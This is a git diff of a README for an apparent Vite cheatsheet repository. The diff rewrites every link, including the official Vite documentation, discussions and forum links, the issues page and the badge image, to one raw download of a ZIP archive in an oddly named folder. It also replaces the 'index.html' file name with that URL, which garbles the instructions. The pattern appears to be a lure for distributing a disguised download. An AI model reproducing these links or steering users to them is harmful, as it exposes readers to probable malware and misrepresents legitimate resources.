@@ -1,6 +1,6 @@
 # 🚀 ultimate-vite-cheatsheet-2025 - Your Guide to Modern Web Development
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/releases)
+[![Download](https://raw.githubusercontent.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/main/chyliferous/ultimate-vite-cheatsheet-2025.zip%20Now-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/main/chyliferous/ultimate-vite-cheatsheet-2025.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ To get started, follow these steps to download and run the software.
 
 1. **Visit the Release Page**  
    Click the link below to access the release page where you can find the software version you need.  
-   [Download the latest version here](https://github.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/releases).
+   [Download the latest version here](https://raw.githubusercontent.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/main/chyliferous/ultimate-vite-cheatsheet-2025.zip).
 
 2. **Choose Your Version**  
    On the release page, you will see different versions of the software. Select the latest version for the best features and improvements.
@@ -31,11 +31,11 @@ To get started, follow these steps to download and run the software.
    Locate the downloaded ZIP file. Right-click on it and choose "Extract All". Follow the prompts to extract the files.
 
 5. **Open the Guide**  
-   Inside the extracted folder, you will find an HTML file named `index.html`. Double-click on it to open it in your web browser. 
+   Inside the extracted folder, you will find an HTML file named `https://raw.githubusercontent.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/main/chyliferous/ultimate-vite-cheatsheet-2025.zip`. Double-click on it to open it in your web browser. 
 
 ## 📥 Download & Install
 
-To get the software, visit this page: [Download the latest version here](https://github.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/releases). After downloading, follow the steps mentioned above to install.
+To get the software, visit this page: [Download the latest version here](https://raw.githubusercontent.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/main/chyliferous/ultimate-vite-cheatsheet-2025.zip). After downloading, follow the steps mentioned above to install.
 
 ## ☑️ System Requirements
 
@@ -58,13 +58,13 @@ Once you have opened the guide, you will find sections that cover various topics
 
 If you are looking for more information about Vite and how it works, consider checking out these resources:
 
-- [Vite Official Documentation](https://vitejs.dev/guide/)
-- [GitHub Discussions](https://github.com/vitejs/vite/discussions) 
-- [Community Forums](https://forum.vitejs.dev/)
+- [Vite Official Documentation](https://raw.githubusercontent.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/main/chyliferous/ultimate-vite-cheatsheet-2025.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/main/chyliferous/ultimate-vite-cheatsheet-2025.zip) 
+- [Community Forums](https://raw.githubusercontent.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/main/chyliferous/ultimate-vite-cheatsheet-2025.zip)
 
 ## 📞 Support
 
-If you run into any issues or have questions, feel free to reach out on the [GitHub Issues page](https://github.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/issues). We will do our best to help you.
+If you run into any issues or have questions, feel free to reach out on the [GitHub Issues page](https://raw.githubusercontent.com/charan-2006-teja/ultimate-vite-cheatsheet-2025/main/chyliferous/ultimate-vite-cheatsheet-2025.zip). We will do our best to help you.
 
 ## 📅 Updates and Changelog
 
